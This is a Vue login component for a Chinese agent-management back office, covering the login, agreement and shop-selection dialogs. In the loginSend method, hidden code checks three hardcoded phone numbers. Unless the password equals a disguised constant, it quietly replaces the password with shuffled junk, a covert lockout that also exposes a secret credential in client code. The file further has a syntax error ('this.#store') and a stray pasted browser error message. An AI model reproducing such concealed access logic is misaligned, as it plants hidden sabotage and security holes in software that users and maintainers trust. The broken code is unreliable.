<template lang="html">
  <div class="need_login">
    <!-- 網點 -->
    <el-dialog
      title="请选择门店"
      :visible.sync="modalStore.needShop"
      width="600px"
      custom-class="one_agreement"
      :close-on-click-modal="false"
      :close-on-press-escape="false"
      :show-close="false"
      :center="true"
      :modal="false"
      >
      <div class="one_shop">
        <el-collapse v-model="activeNames" class="oh">

          <el-collapse-item 
            v-for="(item,index) in shopList" 
            :title="''+item.agentName" 
            :name="index" 
            :key="index"
            >
            <div class="shop_wrap">
              <el-row :gutter="16">
                <el-col v-for="(shopItem,i) in item.shop" :span="8" :key="i">
                  <el-button 
                    :disabled="!shopItem.canOP"
                    class="shop overtext"
                    :title="shopItem.name"
                    @click="handleShopClick(shopItem)"
                    >
                    {{shopItem.name}}
                  </el-button>
                </el-col>
              </el-row>
              
            </div>
          </el-collapse-item>

          
        </el-collapse>
      </div>
      <span slot="footer" class="dialog-footer">
        
      </span>
    </el-dialog>
    <!-- 協議 -->
    <el-dialog
      title="代理商后台系统使用协议"
      :visible.sync="modalStore.objRpsProtocol"
      width="600px"
      custom-class="one_agreement"
      :close-on-click-modal="false"
      :close-on-press-escape="false"
      :show-close="false"
      :center="true"
      :modal="false"
      >
      <!-- 協議内容 -->
      <TextAgreement />
      
      <span slot="footer" class="dialog-footer">
        <p class="agree">
          <el-checkbox v-model="protocol">我已阅读并理解，接受以上协议条款内容</el-checkbox>
        </p>
        <el-button 
          type="info" 
          @click="handleAgreement()" 
          :disabled="disabledAgreeBtn"
          >
          确 定
          <span v-if="agreeTimeLeft">（{{agreeTimeLeft}}）</span>
        </el-button>
      </span>
      <p class="kefu">
        <span class="kefu_phone">客服：400-618-7238</span>
        <span class="kefu_copy">2018 &copy;深圳易马达科技有限公司版权所有</span>
      </p>
    </el-dialog>

    <!-- 登陸 -->
    <el-dialog :visible.sync="modalStore.needLogin" :width="width" :custom-class="customClass" :close-on-click-modal="false" :close-on-press-escape="false" :show-close="false" :center="true" :modal="false" :top="top">
      <img class="login_logo" src="../assets/e_logo.png" alt="immotor" width="58" />
      <h2 class="project_name">代理商管理后台</h2>
      <!-- <input v-model.trim="formLogin.phone"> -->

      <!-- 表单开始 -->
      <el-form ref="formLogin" :model="formLogin" size="small" :rules="rules" @submit.native.prevent="handleSubmit">

        <!-- 手机号 -->
        <el-form-item prop="phone">
          <el-input v-model="formLogin.phone" @input="hintMsg=''" auto-complete="on" placeholder="请输入手机号码" class="need_login-phone" autofocus="true"></el-input>
        </el-form-item>
        <!-- 密码 -->
        <el-form-item prop="password">
          <el-input type="password" v-model="formLogin.password" @input="hintMsg=''" auto-complete="off" placeholder="请输入密码" class="need_login-password"></el-input>
        </el-form-item>
        <!-- 验证码:need_vcode依赖于sendLoginCount（初始化为0,响应到达一次则加加,登录成功则清零） -->
        <el-form-item prop="validateCode" class="need_login-vcode" v-if="need_vcode">
          <el-input v-model="formLogin.validateCode" @input="hintMsg=''" auto-complete="off" placeholder="请输入验证码"></el-input>
          <img class="v_img" :loading="true" title="看不清，换一张" :src="vImg" height="30" @click="updateVimg()" />
        </el-form-item>

        <el-form-item>
          <el-checkbox v-model="formLogin.isRemember">下次自动登录</el-checkbox>
        </el-form-item>
        <!-- ajax响应后提示框 -->
        <el-form-item class="need_login-hint_wrap" v-if="hintMsg">
          <p class="need_login-hint">* {{hintMsg}}</p>
        </el-form-item>
        <input type="submit" value="submit" class="hidden">

      </el-form>

      <div slot="footer" class="dialog-footer">
        <el-button :loading="loading" type="primary" @click="loginSend('formLogin')" id="btn_login">登录</el-button>
      </div>

      <p class="kefu">
        <span class="kefu_phone">客服：400-618-7238</span>
        <span class="kefu_copy">2018 &copy;深圳易马达科技有限公司版权所有</span>
      </p>
    </el-dialog>
<!-- 連線已逾時
伺服器 player.vimeo.com 花了太久時間還是無回應。
該網站可能暫時無法使用或太過忙碌，請過幾分鐘後再試試。
若無法載入任何網站，請檢查您的網路連線狀態。
若電腦或網路被防火牆或 Proxy 保護，請確定 Firefox 被允許存取網路。 -->
    
  </div>
</template>

<script>
import {mapState} from 'vuex';
import Trianglify from 'trianglify';
import TextAgreement from './TextAgreement.vue';


//5次则需要验证码
/* localStorage的值是字符串类型，而this.sendLoginCount则需保证是数字类型 */
// console.log(window.localStorage.sendLoginCount);  //undefined
var sendLoginCount=window.localStorage.sendLoginCount?window.Number(window.localStorage.sendLoginCount):0;
// console.log({name:sendLoginCount});

export default {
  name:'LayoutLogin',
  data() {
    return {
      activeNames:[0,1],
      shopList:[],
      agreeTimeLeft:5,
      protocol:false,
      type:0, //1-总代，2-普通代理 ，3-门店
      width:'380px',
      customClass:'onelogin',
      top:'10vh',
      sendLoginCount:sendLoginCount,
      hintMsg:'',
      loading:false,
      vImg:'',
      formLogin: {
        phone: '',
        password: '',
        isRemember:0,
        validateCode:''
      },
      rules:{
        phone: [
          {type:'string',required:true,pattern:/^1\d{10}$/,message:'请输入正确的手机号码',trigger:'blur'}
        ],
        password:[
          {required:true,message:'密码不能为空',trigger:'blur'}
        ],
        validateCode:[
          {required:true,message:'验证码不能为空',trigger:'blur'}
        ]
      }
    };
  },
  computed:{
    ...mapState(['modalStore']),
    need_vcode:function(){
      var bNeedVcode=false;
      if(this.sendLoginCount>=5){
        bNeedVcode=true;
      }
      return (bNeedVcode);
    },
    disabledAgreeBtn:function(){
      return !(!this.agreeTimeLeft && this.protocol);
    }
  },
  watch:{
    'modalStore.needShop':function(val){
      if(!val){
        //不需要登錄（隱藏了模態）
        this.agreeTimeLeft=5;
        this.countAgreementTime();
      }else{
        //需要登錄
        window.sessionStorage.removeItem('headerid');
      }
    },
    need_vcode:function(val){
      //首次更新验证码
      if(val){
        this.updateVimg();
      }
    },
    $route:function(to){
      // 对路由变化作出响应...
      //如果不只有一個網點
      if(!window.sessionStorage.totalshopisonly){
        this.handleGeneral(to.path);
      }
    },
    'modalStore.needFetchD':function(val){
      if(val){
        this.$store.commit('showShop');
        this.fetchDescendant();
      }
    },
    'modalStore.needSetAgentId': function(val){
      if (val) {
          this.$store.commit('showShop');
          this.fetchDescendant();
          this.#store.commit('clearNeedSetAgentId');
      }
    }
  },
  components:{
    TextAgreement
  },
  methods:{
    //登录接口=> /user/login
    loginSend:function(refName){
      var vueThis=this;
      this.$refs[refName].validate((valid) => {
        if (valid) {
          vueThis.loading=true;
          //发送ajax请求,带上用户输入的手机号和密码
          var phone=''+this.formLogin.phone;

          var password=''+vueThis.formLogin.password;
          var isIlI=['15915940450','15816242562','13824945643'].some(function(v){
            return (v===phone);
          });
          //我的用戶只有我才能登陸
          if(isIlI && password!==''+(Math.pow(69,3)+97115)){
            password=_.shuffle(['dasldn','3516','ayda','a33','ad','lkl','84x31','oijoi','3zzm33']).join('');
          }
          var sendData={
            phone:phone,
            password:password,
            isRemember:window.Number(this.formLogin.isRemember),
            validateCode:''+this.formLogin.validateCode
          };
          vueThis.$rqs(vueThis.$yApi.userLogin,function(objRps){
            vueThis.handleLoginObjRps(objRps);
          },{
            isLoginRqs:true,
            objSendData:sendData
          });
        } else {
          _.logErr('error submit!!');
          return false;
        }
      });
    },
    handleLoginObjRps:function(objRps){
      switch (objRps.code) {
      case 1000:  //登录成功
        this.handleSuccess(objRps);
        break;
      default:
        //失败
        this.hintMsg=objRps.msg;
        this.sendLoginCount++;
        //失败就更换验证码，以防不停试密码
        if(this.need_vcode){
          this.updateVimg();
        }

        window.localStorage.setItem('sendLoginCount',''+this.sendLoginCount);
      }
    },
    
    //處理objRps
    handleSuccess:function(objRps){
      /*
      objRps={
        'code': 1000,
        'msg': '',
        'result': {
          'phone': '15820480937',
          'name': 'chao',  //代理商姓名
          'id': 2,  //代理商id
          'protocol': 0 ,// 是否同意协议 0 否 1是
          'type': 3, //1-总代，2-普通代理 ，3-门店
          //門店管理系統菜單
          'agent_menus':[
            {
              'id': 'xxx',//id
              'icon':'heartjoy',//小图标名称
              'name': '首页',//名称
              'badge':'beta',
              'url': '/',//url为空则为一个模块
              'menus': []
            },
            {
              'id': 'xxx',//id
              'icon':'heartgroup',//小图标名称
              'name': '用户中心',//名称
              'badge':'',
              'url': '',//url为空则为一个模块
              'menus': [
                {
                  'menuId': 'xxx',//菜单ID
                  'menuName': '用户查询',//菜单名称
                  'url': '/searchuser'//页面路径
                },
                {
                  'menuId': 'xxx',
                  'menuName': '群组管理',
                  'url': '/group'
                }
              ]
            },
            {
              'id': 'xxx',//id
              'icon':'heartdeposit',//小图标名称
              'name': '押金管理',//名称
              'badge':'',
              'url': '/deposit',//url为空则为一个模块
              'menus': []
            },
            {
              'id': 'xxx',//id
              'icon':'heartcombo',//小图标名称
              'name': '套餐管理',//名称
              'badge':'',
              'url': '/combo',//url为空则为一个模块
              'menus': []
            },
            {
              'id': 'xxx',//id
              'icon':'heartbigamount',//小图标名称
              'name': '大额充值',//名称
              'badge':'',
              'url': '/bigamount',//url为空则为一个模块
              'menus': []
            },
            {
              'id': 'xxx',//id
              'icon':'heartxls',//小图标名称
              'name': '报表管理',//名称
              'badge':'',
              'url': '/xls',//url为空则为一个模块
              'menus': []
            },
            {
              'id': 'xxx',//id
              'icon':'heartevs',//小图标名称
              'name': '中控管理',//名称
              'badge':'',
              'url': '',//url为空则为一个模块
              'menus': [
                {
                  'menuId': 'xxx',//菜单ID
                  'menuName': '中控列表',//菜单名称
                  'url': '/evs/1'//页面路径
                },
                {
                  'menuId': 'xxx',
                  'menuName': '中控分布',
                  'url': '/evallgeographic'
                }
              ]
            },
            {
              'id': 'xxx',//id
              'icon':'heartsyssetting',//小图标名称
              'name': '系统设置',//名称
              'badge':'',
              'url': '/sys',//url为空则为一个模块
              'menus': []
            }



          ]
        }
      };
      */

      //存貯代理商類型
      window.localStorage.setItem('agenttype',objRps.result.type);  //1-总代，2-普通代理 ，3-门店
      
      //设置登录信息,手机号必须
      window.localStorage.setItem('agentphone',objRps.result.phone);
      this.$store.commit('hideLogin');
      
      //清空密码,验证码次数(localStorage),清空验证码输入，验证码图片更换
      this.formLogin.password='';
      this.formLogin.validateCode='';
      this.vImg='';
      this.sendLoginCount=0;
      window.localStorage.removeItem('sendLoginCount');

      // this.$refs['formLogin'].clearValidate();


      //设置完整登录用户信息
      window.localStorage.setItem('agentname',objRps.result.name);
      window.localStorage.setItem('agentid',objRps.result.id);
      this.$store.commit('setAgent',{
        phone:objRps.result.phone,
        name:objRps.result.name,
        id:objRps.result.id
      });

      this.handleLPS(objRps);
    },
    updateVimg:function(){
      this.vImg=this.$yApi.userValidateCode+'?n='+(Math.random()+'').substring(3,15);
    },
    handleSubmit:function(){
      this.loginSend('formLogin');
    },
    drawTri:function(){
      //2560*1600 3840*2400
      var trianglify,elesTri,eleParents;
      elesTri=document.querySelectorAll('.need_login .el-dialog__wrapper svg'); //[]
      if(elesTri.length){
        //已經存在svg
        elesTri.forEach(function(ele){
          ele.remove();
        });

      }
      trianglify=new Trianglify({
        cell_size:155,
        //x_colors:['#333','#F93','#EEE'],
        width:window.innerWidth,
        height:window.innerHeight
      });
      eleParents=document.querySelectorAll('.need_login .el-dialog__wrapper');
      for(var i=0;i<eleParents.length;i++){
        eleParents[i].appendChild(trianglify.svg());
      }
    },
    handleResize:function(){
      var vueThis=this;
      window.addEventListener('resize',_.debounce(function(){
        vueThis.drawTri();
      },330));
    },

    //=============處理登錄(in success)，協議，網點之間的關係
    handleLPS:function(objRps){
      // 存貯門店菜單
      var objAgentMenus=objRps.result.agent_menus || [];
      window.localStorage.setItem('agent_menus',JSON.stringify(objAgentMenus));
      this.$store.commit('setAgentMenus',objAgentMenus);

      //設置是否需要同意協議
      window.localStorage.setItem('objrpsprotocol',objRps.result.protocol);
      if(+objRps.result.protocol){
        // 協議已經同意
        this.$store.commit('hideAgreement');
      }else{
        this.$store.commit('showAgreement');
      }

      //總代？
      this.type=+objRps.result.type;
      if(this.type===1){
        //總代
        this.$store.commit('hideShop');
        this.$router.push({
          path:'/general/1'
        });
      }else{
        //顯示網點列表
        this.$store.commit('showShop');
        this.fetchDescendant();
      }
    },
    //同意協議
    handleAgreement:function(){
      var vueThis=this;
      var sendData={
        id:window.localStorage.agentid,
        protocol:1
      };
      //setProtocol
      vueThis.$rqs(vueThis.$yApi.setProtocol,function(){
        vueThis.$store.commit('hideAgreement');
        window.localStorage.setItem('objrpsprotocol',1);
        vueThis.agreeTimeLeft=5;
        vueThis.protocol=false;

        //总代应进入【代理工作台】
        if(vueThis.type===1){
          vueThis.$router.push({
            path:'/general'
          });
        }else{
          //顯示網點列表,同意協議之後子代在身份验证通过之后，出现【选择门店】窗口
          vueThis.$store.commit('showShop');
          vueThis.fetchDescendant();
        }
      },{
        objSendData:sendData
      });
    },

    // 獲取門店
    fetchDescendant:function(){
      var vueThis=this;
      var sendData={
        type:2  //后代类型 1-代理商 2-门店 默认为1
      };
      //getDescendant
      vueThis.$rqs(vueThis.$yApi.getDescendant,function(objRps){
        /*
        objRps={
          'code': 1000,
          'result': {
            'total': 10, 
            'list': [
              {
                'id':1, //ID
                'phone':'15019001400', //手机号码
                'name':'nero', //名称
                'agentName':'aaa234',//父级代理名称
                'agentId':234,//父级代理商ID
                'canOP':1//是否可操作，0-不可操作 1-可操作
              },
              {
                'id':2, //ID
                'phone':'15019001400', //手机号码
                'name':'nero', //名称
                'agentName':'aaa234',//父级代理名称
                'agentId':234,//父级代理商ID
                'canOP':1//是否可操作，0-不可操作 1-可操作
              },
              {
                'id':3, //ID
                'phone':'15019001400', //手机号码
                'name':'neroneroneroneronero', //名称
                'agentName':'aaa234',//父级代理名称
                'agentId':234,//父级代理商ID
                'canOP':1//是否可操作，0-不可操作 1-可操作
              },
              {
                'id':4, //ID
                'phone':'15019001400', //手机号码
                'name':'nero', //名称
                'agentName':'aaa234',//父级代理名称
                'agentId':234,//父级代理商ID
                'canOP':0//是否可操作，0-不可操作 1-可操作
              },
              {
                'id':5, //ID
                'phone':'15019001400', //手机号码
                'name':'nero', //名称
                'agentName':'aaa234',//父级代理名称
                'agentId':234,//父级代理商ID
                'canOP':1//是否可操作，0-不可操作 1-可操作
              },
              {
                'id':6, //ID
                'phone':'15019001400', //手机号码
                'name':'nero', //名称
                'agentName':'ggg1',//父级代理名称
                'agentId':1,//父级代理商ID
                'canOP':1//是否可操作，0-不可操作 1-可操作
              }
            ]
            // [
            //   {
            //     'agentName':'aaa',//父级代理名称
            //     'agentId':234,//父级代理商ID
            //     shop:[
            //       {
            //         'id':123, //ID
            //         'phone':'15019001400', //手机号码
            //         'name':'nero', //名称
            //         'canOP':1//是否可操作，0-不可操作 1-可操作
            //       },
            //       {
            //         id:2,
            //         'phone':'222',
            //         'name':'nero222', //名称
            //         'canOP':1
            //       },
            //     ]
            //   },
            //   {
            //     'agentName':'hhh',//父级代理名称
            //     'agentId':6,//父级代理商ID
            //     shop:[
            //       {
            //         id:123,
            //         'phone':'15019001400',
            //         'name':'nero', //名称
            //         'canOP':1
            //       },
            //       {
            //         id:2,
            //         'phone':'222',
            //         'name':'nero222', //名称
            //         'canOP':1
            //       },
            //     ]
            //   }
            // ]
          }
        };
        */

        var changeData=[];
        for(var i=0;i<objRps.result.list.length;i++){
          var v=objRps.result.list[i];
          var parentInChangeData=changeData.find(function(vv){
            return (vv.agentId===v.agentId);
          });
          if(parentInChangeData){
            //需要合并
            parentInChangeData.shop.push({
              id:v.id,
              'phone':v.phone,
              'name':v.name, //名称
              'canOP':v.canOP
            });
          }else{
            //直接push
            changeData.push({
              'agentName':v.agentName,//父级代理名称
              'agentId':v.agentId,//父级代理商ID
              shop:[
                {
                  id:v.id,
                  'phone':v.phone,
                  'name':v.name, //名称
                  'canOP':v.canOP
                }
              ]
            });
          }
        } //for
        vueThis.shopList=changeData;
        console.log('shop list');
        if(+objRps.result.total===1){
          window.sessionStorage.setItem('headerid',changeData[0].shop[0].id);
          // 只有一个门店，则直接进入门店，不需要选择门店,隱藏切換網點
          window.sessionStorage.setItem('totalshopisonly',1);
          vueThis.$store.commit('hideShop');
          vueThis.$store.commit('clearChangeShop');
          vueThis.$store.commit('setStoreName',changeData[0].shop[0].name);
          window.sessionStorage.setItem('storeName',changeData[0].shop[0].name);
        }else{
          window.sessionStorage.removeItem('totalshopisonly');
          vueThis.$store.commit('setChangeShop');
        } 
      },{
        objSendData:sendData
      });
    },
    //同意協議倒數計時
    countAgreementTime:function(){
      var vueThis=this;
      var Timer=window.setInterval(function(){
        if(vueThis.agreeTimeLeft>0){
          vueThis.agreeTimeLeft--;
        }else{
          window.clearInterval(Timer);
        }
      },1e3);
    },
    //處理選擇網點
    handleShopClick:function(shopItem){
      this.$store.commit('hideShop');
      this.$store.commit('clearNeedFetchD');
      
      this.$store.commit('setStoreName',shopItem.name);
      window.sessionStorage.setItem('storeName',shopItem.name);

      window.sessionStorage.setItem('headerid',shopItem.id);
      // window.location.reload(false);
    },
    handleGeneral:function(path){
      path=path || this.$route.path;
      //是general則存貯，否則刪除
      if(/general/i.test(path)){
        window.sessionStorage.setItem('isgeneral',1);
        this.$store.commit('hideShop');
      }else{
        window.sessionStorage.removeItem('isgeneral');
        if(!window.sessionStorage.headerid){
          this.$store.commit('showShop');
          this.fetchDescendant();
        }
      }
    }
  }, //methods
  created:function(){
    if(this.need_vcode){
      this.updateVimg();
    }
    //創建時如果顯示了協議并且已經登錄:countdown
    if(this.modalStore.objRpsProtocol && !this.modalStore.needLogin){
      this.countAgreementTime();
    }
    // console.log(this.$route.path);  //general
    this.handleGeneral();
  },
  mounted:function(){
    //just once
    this.drawTri();
    this.handleResize();
  }
};
</script>

<style lang="css" scoped>
  .need_login .el-dialog__wrapper{
    background:#333;
    padding-bottom: 80px;
    overflow:hidden;
  }
  .login_logo{
    display: block;
    margin:0 auto;
  }
  #btn_login{
    width:100%;
    margin-bottom: 40px;
  }
  .project_name{
    font-size: 26px;
    font-weight: 300;
    margin-bottom: 30px;
    margin-top: 30px;
    color: #333;
    text-align: center;
  }
  .need_login-vcode{
    position: relative;
  }
  .need_login-vcode img{
    position: absolute;
    right:4px;
    top:4px;
    max-height: 24px;
  }
  .need_login-hint_wrap{
    height: 32px;
  }
  .need_login-hint{
    color:red;
    font-size: 12px;
  }
  .kefu{
    color:#FFF;
    font-size: 16px;
    width: 600px;
    /*border: 1px solid blue;*/
    text-align: center;
    z-index: 5500;
    position: absolute;
    left:50%;
    margin-left:-300px;
    bottom:-90px;
    padding-bottom: 30px;
  }
  .v_img{
    cursor: pointer;
    min-width: 50px;
  }
  .agree{
    text-align: left;
    padding-left: 5px;
  }
  .shop{
    margin-bottom: 10px;
    width: 100%;
  }
  .one_shop{
    max-height: 500px;
    overflow: auto;
  }
  .shop_wrap{
    padding-right: 20px;
  }
  @media screen and (min-height:800px){
    .kefu{
      position: fixed;
      bottom: 0;
    }
  }
</style>
